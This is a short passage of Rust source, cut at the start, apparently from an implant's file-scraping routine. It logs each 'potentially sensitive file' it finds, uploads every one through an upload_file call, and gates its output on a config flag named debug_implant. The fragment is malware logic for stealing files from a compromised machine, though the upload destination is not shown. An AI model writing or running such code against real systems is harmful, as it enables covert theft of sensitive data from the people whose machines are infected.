            println!("[INFO] Found potentially sensitive file: {}", found_file);
        }
        upload_file(&found_file);
    }

    for err in error_rx {
        if lazyconf.debug_implant == "True" {
            eprintln!("[ERROR] Error during file scraping: {}", err);
        }
    }

    if lazyconf.debug_implant == "True" {
        println!("[INFO] File scraping finished.");
    }
}